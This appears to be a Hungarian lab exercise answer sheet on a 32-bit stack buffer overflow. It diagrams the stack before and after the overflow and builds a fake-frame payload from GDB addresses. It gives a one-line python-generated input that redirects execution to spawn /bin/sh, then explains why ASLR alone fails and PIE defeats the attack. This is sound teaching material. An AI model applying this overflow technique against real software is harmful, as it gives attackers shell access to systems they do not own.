# 3
**Támadás előtti (normál) állapot:**
```text
[ Magasabb memóriacímek ]
+-------------------------+
| char *string (mutató)   |  <- Argumentum (az argv[1] memóriacíme)
+-------------------------+
| Return Address (EIP)    |  <- Ide térne vissza a vezérlés a main() függvénybe
+-------------------------+
| Saved EBP               |  <- A hívó függvény (main) EBP regisztere (4 bájt)
+-------------------------+
| buffer[4..7]            |  <- \ buffer (8 bájt méretű tömb)
| buffer[0..3]            |  <- /
+-------------------------+
[ Alacsonyabb memóriacímek ]
```

**Támadás (Ret2libc/Shellcode injekció) utáni állapot:**
Mivel paramétert is át akarunk adni a függvénynek (`/bin/sh`), úgynevezett hamis stack framet (Fake Stack Frame) kell építenünk. Ekkor az injektált függvény (`now_called`) után elhelyezünk egy hamis visszatérési címet (pl. vissza a main-be, hogy ne crasheljen le azonnal), és utána az argumentum mutatóját (`not_used`).

```text
[ Magasabb memóriacímek ]
+-------------------------+
| char *string (mutató)   |
+-------------------------+
| mutató a "/bin/sh"-ra   |  <- argumentum a now_called fügvénynek (pl. \x08\xa0\x04\x08)
+-------------------------+
| Return Address (fake)   |  <- ide tér vissza a now_called (pl. \x35\x92\x04\x08 -> main címe) 
+-------------------------+
| Return Address (EIP)    |  <- Cím kicserélve a now_called címére (pl. \x96\x91\x04\x08)
+-------------------------+
| Saved EBP               |  <- BBBB (Felülírva a payloadból)
+-------------------------+
| buffer[4..7]            |  <- AAAA (Felülírva a payloadból)
| buffer[0..3]            |  <- AAAA (Felülírva a payloadból)
+-------------------------+
[ Alacsonyabb memóriacímek ]
```

# 4

A kitűzött cél eléréséhez a következő támadó input (payload) szükséges:
16 bájtnyi padding (AAAA...BBBB...) a buffer és az EBP felülírására, majd a `now_called` függvény címe (EIP felülírása), utána egy hamis visszatérési cím (pl. vissza a main-be), végül a `/bin/sh` argumentum címe (a `not_used` változó címe).

Példa payload a GDB-ben meghatározott címekkel:
* bemenet / padding: `16 byte ("A"*16)`
* EIP (`now_called`): `0x08049196 -> \x96\x91\x04\x08`
* Fake RET (`main`): `0x08049235 -> \x35\x92\x04\x08`
* Argumentum (`not_used`): `0x0804a008 -> \x08\xa0\x04\x08`

Parancs:
```bash
./app_32 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x96\x91\x04\x08" + b"\x35\x92\x04\x08" + b"\x08\xa0\x04\x08")')"
```

# 5
Vizsgálja meg, hogy ha ASLR engedélyezésével fordítja le az alkalmazást (make withASLR és make withASLRwithPIE), akkor az véd-e a támadás ellen! Magyarázza meg az eredményt!

**Eredmény:**
1. `make withASLR`: **Nem véd meg** a támadástól, a payload továbbra is működik (shell megnyílik).
2. `make withASLRwithPIE`: **Megvéd** a támadástól (Segmentation fault-ot kapunk).

**Magyarázat:**
- **withASLR (csak ASLR):** Az alap ASLR véletlenszerűsíti a heap, a stack és a megosztott könyvtárak (pl. libc) kezdőcímeit. Azonban **nem** véletlenszerűsíti magának az alkalmazás kódjának, adatainak (pl. `.text`, `.data` szekciók) memóriacímeit. Mivel korábban a támadás fix kódcímekre (`now_called` függvény: `0x08049196`) és változókra (`not_used`: `0x0804a008`) épült a futtatható binárisból, azok a memóriában mindig ugyanazon a fix helyen maradnak, így a támadás sikeres lesz.
- **withASLRwithPIE (ASLR + PIE):** A PIE (Position Independent Executable) kapcsoló alkalmazásakor a vezérlő úgy fordítja le a binárist, hogy az egész program (annak kódja és adatszegmensei is) címezéstől független legyen, ami lehetővé teszi, hogy az ASLR ne csak a heap/stack címét, hanem magának a **program struktúrának a báziscímét is véletlenszerűsítse** minden futáskor. Következésképpen a fixen bedrótozott támadási payload címei érvénytelenek lesznek a következő futtatásnál, emiatt a program egyszerűen az adott (hamis) és ezáltal védtelen címre ugráskor segfault hálót dob (összeomlik), jelentősen meggátolva ezzel a támadást.
